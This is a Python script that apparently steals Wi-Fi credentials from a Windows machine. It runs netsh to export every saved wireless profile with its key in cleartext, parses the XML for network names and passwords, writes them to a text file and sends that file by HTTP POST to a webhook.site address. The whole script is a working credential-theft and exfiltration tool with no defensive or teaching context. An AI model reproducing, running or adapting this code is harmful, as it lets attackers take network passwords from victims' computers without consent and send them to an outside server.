import subprocess
import os
import sys
import requests

# URL
URL = 'https://webhook.site/eef7c413-6ede-441a-a43b-9df04cfa3709'

# Create file
password_file = open('Users.txt', "w")
password_file.write("Code: \n\n")
password_file.close()

# Lists
wifi_files = []
wifi_name = []
wifi_password = []

# Execute Windows cmd
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

# Grab os directory
path = os.getcwd()

# Loop
for filename in os.listdir(path):
    if filename.startswith("WiFi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("Users.txt", "a")
                            print("SSID: " + x, "Password: " + y, sep='\n')
                            sys.stdout.close()

# Execute
with open('Users.txt', 'rb') as f:
    r = requests.post(URL, data=f)
